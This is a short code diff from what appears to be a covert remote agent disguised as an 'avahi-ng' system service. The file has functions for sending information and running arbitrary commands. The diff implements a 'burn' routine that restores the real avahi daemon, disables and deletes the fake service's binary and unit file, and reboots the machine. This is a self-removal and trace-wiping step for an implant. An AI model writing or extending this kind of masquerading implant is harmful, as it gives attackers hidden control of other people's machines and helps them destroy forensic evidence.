@@ -60,8 +60,11 @@ def send_info():
 
 def burn():
     # Uninstall agent
-    logging.error("Burnit is not yet implemented!")
-    pass
+    os.system("systemctl unmask avahi-daemon.service")
+    os.system("systemctl disable avahi-ng")
+    os.system("rm -f /usr/bin/avahi-ng /etc/systemd/system/avahi-ng.service")
+    os.system("reboot")
+    exit()
 
 
 def arbitrary_exec(command: str):
